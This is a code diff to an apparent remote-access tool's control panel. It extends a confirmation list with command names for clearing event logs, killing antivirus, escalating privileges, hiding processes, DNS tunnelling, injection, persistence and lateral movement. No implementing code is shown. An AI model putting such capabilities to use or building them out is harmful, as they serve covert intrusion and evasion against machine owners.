@@ -25,28 +25,48 @@ let filesPagination = {
 
 // Dangerous commands that require confirmation
 const DANGEROUS_COMMANDS = [
-    // Windows Security
+    // Elite Security Commands
+    'elite_clearev',
+    'elite_avkill',
+    'elite_escalate',
+    'elite_clearlogs',
+    'elite_hideprocess',
+    'elite_hidefile',
+    
+    // Elite System Control
+    'elite_lockscreen',
+    'elite_freeze',
+    'elite_shutdown',
+    'elite_restart',
+    'elite_sudo',
+    
+    // Elite Network Modifications
+    'elite_hostsfile',
+    'elite_firewall',
+    'elite_dns_tunnel',
+    
+    // Elite Advanced Features
+    'elite_inject',
+    'elite_migrate',
+    'elite_persist',
+    'elite_lateral',
+    
+    // Legacy commands (for backward compatibility)
     'clearev',
     'avkill',
     'disableRDP',
     'disableUAC',
     'disableWindef',
     'scanreg',
-    
-    // System Control
     'lockscreen',
     'displayoff',
     'freeze start',
     'freeze',
     'shutdown',
     'reboot',
-    
-    // Network Modifications
     'hostsfile remove',
     'hostsfile update',
     'firewall close',
-    
-    // File Operations
     'hide',
     'editaccessed',
     'editcreated',
